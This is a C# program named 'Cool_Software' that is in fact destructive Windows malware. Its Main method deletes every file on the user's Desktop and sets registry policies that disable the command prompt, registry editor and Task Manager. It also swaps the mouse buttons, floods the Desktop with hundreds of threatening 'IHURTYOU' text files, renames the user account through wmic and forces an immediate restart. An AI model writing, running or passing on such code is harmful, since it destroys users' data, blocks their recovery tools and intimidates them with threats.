using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace Cool_Software;

public class Program
{
	private static void DeleteFilesOnDesktop()
	{
		foreach (string item in Directory.EnumerateFiles(Environment.GetEnvironmentVariable("Userprofile") + "\\Desktop", "*.*", SearchOption.AllDirectories))
		{
			try
			{
				File.Delete(item);
			}
			catch (Exception)
			{
			}
		}
	}

	private static void EditRegistry()
	{
		Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 2, RegistryValueKind.DWord);
		Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop");
		Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WallPaper", "", RegistryValueKind.String);
		Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1, RegistryValueKind.DWord);
		Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);
		Registry.CurrentUser.OpenSubKey("Control Panel\\Mouse");
		Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "SwapMouseButtons", "1", RegistryValueKind.String);
	}

	private static void CreateFilesOnDesktop()
	{
		int num = new Random().Next(300, 500);
		string text = Environment.GetEnvironmentVariable("Userprofile") + "\\Desktop";
		for (int i = 0; i < num; i++)
		{
			File.WriteAllText(text + "\\IHURTYOU" + (i + 1) + ".txt", "I want to hurt you\n\n\n\nDO NOT GO OUTSIDE\n\nYOU WILL DIE");
		}
	}

	private static void RenameUser()
	{
		string arguments = " useraccount where name=\"" + Environment.UserName + "\" rename \"I HURT YOU\"";
		Process process = new Process();
		process.StartInfo.FileName = "wmic.exe";
		process.StartInfo.Arguments = arguments;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
	}

	private static void RestartComputer()
	{
		Process process = new Process();
		process.StartInfo.FileName = "shutdown.exe";
		process.StartInfo.Arguments = " -r -t 0";
		process.StartInfo.CreateNoWindow = true;
		process.Start();
	}

	public static void Main()
	{
		DeleteFilesOnDesktop();
		EditRegistry();
		CreateFilesOnDesktop();
		RenameUser();
		RestartComputer();
	}
}
